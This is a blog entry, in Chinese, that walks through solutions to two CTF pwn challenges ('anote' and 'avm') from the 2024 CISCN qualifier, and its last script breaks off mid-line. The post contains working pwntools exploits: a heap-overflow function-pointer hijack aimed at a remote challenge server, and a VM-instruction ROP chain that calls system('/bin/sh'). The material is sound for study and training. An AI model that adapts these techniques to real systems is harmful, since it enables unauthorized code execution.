<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024ciscn&amp;长城杯初赛pwn方向部分题解</title>
    <url>/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h4 id="pwn-anote">pwn-anote</h4>
<p>32位程序，存在后门函数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png"
                      class=""
                >
<p>粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work
done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215183554444.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215184559047.png"
                      class=""
                >
<p>这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函数指针，结合反编译代码不难发现，这个调用的函数指针实际是用来打印<code>work done</code>的，这里我们如果能劫持这个指针到backdoor，就能getshell。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185453342.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185705572.png"
                      class=""
                >
<p>然后看看edit一些参数的限制，其中长度最多为40，但这个长度已经足以进行堆溢出，覆盖到下一个chunk的data域了，那么就可以直接把函数指针给改了。这里的函数指针是二级指针，所以还不能直接填进去backdoor函数的地址，由于gift给了堆上的地址了，那么我们就能先在堆的某个位置填入backdoor地址，然后劫持的函数指针指向该地址处。最后edit触发一下，然后就有shell了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185800640.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190233099.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201646774.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.95.214.102&quot;</span>,<span class="number">20609</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">backdoor = <span class="number">0x80489CE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():       <span class="comment">#max 9</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):     <span class="comment">#size&lt;40,触发函数指针</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)-<span class="number">0x5fc8</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">28</span>,p32(backdoor)*<span class="number">5</span>+p32(<span class="number">0x21</span>)+p32(heap_base+<span class="number">0x5fd0</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">b&quot;abcd&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="pwn-avm">pwn-avm</h4>
<p>VMpwn，首先要逆出其中每个指令的含义，以及自定义指令的构成。</p>
<p>首先主函数可以读取0x300字节的输入，然后进initial函数进行初始化。具体是往opt+0x100地址之后填一些控制信息，然后再把前面的位置都置空。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190920906.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191043445.png"
                      class=""
                >
<p>经过动态调试，最后逆出的opt结构大概是这样，0x108处存我们的输入，也就是具体的指令，0x100处存目前指令的偏移（从后面动调看出），0x110处存最大的指令偏移。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191015846.png"
                      class=""
                >
<p>然后看最重要的parse函数，首先v2里存了我们的选项，后面函数表中总共有10种不同的指令，注意到这里最后向右移位了0x1C，所以我们实际的指令种类是存在左移位0x1C处的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192127742.png"
                      class=""
                >
<p>第一个函数如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192643849.png"
                      class=""
                >
<p>第二个函数如下:</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192712698.png"
                      class=""
                >
<p>第三个函数如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192739108.png"
                      class=""
                >
<p>看了三个具体指令的实现，我们观察到只有最后赋值后面的运算符发生了变化，然后我们就可以猜测其具体就是分别实现了add，sub，mul的功能，以此类推，就能得到前八个函数的大体作用。这里其实我们能看到opt前面0x100个字节分成了32个8字节，分别模拟了32个寄存器，我们的内容都是存在模拟寄存器中，前面8个函数也都只能对模拟寄存器做操作。实际上由于前面把这0x100个字节置空，所以直接调用前面这8个指令，得到的结果永远都是0。还有一点就是发现每个指令都会把opt偏移0x100处累加四，这说明每个指令都占用四个字节长度（逻辑上如此，而实际上后面分析也的确如此）。我们最多可以连续写0x300/0x4=0xc0个指令。</p>
<p>第9个和第10个函数稍微有点不同：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193045374.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193103501.png"
                      class=""
                >
<p>直接看有点摸不着头脑，只知道a2是一个栈上的缓冲区，我们后面动态调试的时候就会发现，这里第9个实际上能够往该缓冲区中写一个前面模拟寄存器的值，其偏移最多为0xFFF；而第十个函数可以从缓冲区偏移最多0xFFF处，读取一个值到我们的模拟寄存器。这里的<code>(HIWORD(v3) &amp; 0xFFF)</code>实际上相当于一个立即数，代表偏移。之后我们的指令表大概就恢复完成了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192212512.png"
                      class=""
                >
<p>下一个问题是指令的具体组成，比如我们想用write_reg往偏移为25的模拟寄存器存缓冲区偏移0xd38的内容，那么我们可以在汇编的具体执行过程中进行分析。逐渐调试就能得到<code>payload = p32((10&lt;&lt;0x1c)+(tarreg&amp;0x1f)+((reg1&amp;0x1f)&lt;&lt;5)+((num&amp;0xfff)&lt;&lt;16))</code>。也就是说指令类型左移位0x1c，存储结果寄存器在最低位（且不超过31），一个被当作偏移的寄存器序号在左移位5位处，立即数在左移位16位处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215194053168.png"
                      class=""
                >
<p>然后就能还原出每一个指令的组成结构：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>之后的问题就是要从栈上已有的固定的内容，读取到模拟寄存器中，这里我们在动态调试时，能够看到缓冲区的起始地址，也就是加上我们的立即数偏移这个位置。这里如果我们最后所有指令结束后，parse函数返回时，就会到偏移0x118位置。我们想要算出gadget和system等相关于libc的地址，所以要获取libc基址。这里能在0xd38偏移位置找到，而且这个是前面栈帧所遗留的，不会在每次程序执行时变化。同时我们还能在这个libc相关地址上面获取到一个1，将他们存到模拟寄存器中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195205194.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195328605.png"
                      class=""
                >
<p>后面就是要先算出libc基址，然后得到ret，pop_rdi_ret，/bin/sh字符串以及system的地址。这里直接自己找栈上的内容，然后一点一点手动构造出来显然不是很现实。然后发现距离libc_base偏移最多的/bin/sh字符串地址的偏移为0x1d8678。换算成二进制，大概要用21个二进制位，不过我们模拟寄存器位充足，最后我用寄存器模拟了23个二进制位。这样我们可以用模拟寄存器的线性组合表示出任何我们想要的偏移。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215200035859.png"
                      class=""
                >
<p>具体组合实现：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)		<span class="comment">#get libc_base，saved in 25</span></span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br></pre></td></tr></table></figure></div>
<p>基本动态调试能正确算出一个偏移，那么其它的也就没问题了，这里我往25号模拟寄存器存libc_base，24号模拟寄存器存偏移。直接往返回地址处写rop链。最后也是只用了0x150字节，离0x300字节的上限还远。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201820964.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># 0x300大小限制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    len    func</span></span><br><span class="line"><span class="comment"># 1   4      add</span></span><br><span class="line"><span class="comment"># 2   4      sub</span></span><br><span class="line"><span class="comment"># 3   4      mul</span></span><br><span class="line"><span class="comment"># 4   4      div</span></span><br><span class="line"><span class="comment"># 5   4      xor</span></span><br><span class="line"><span class="comment"># 6   4      and</span></span><br><span class="line"><span class="comment"># 7   4      shl</span></span><br><span class="line"><span class="comment"># 8   4      shr</span></span><br><span class="line"><span class="comment"># 9   4     write_stack</span></span><br><span class="line"><span class="comment"># 10  4     write_reg</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span 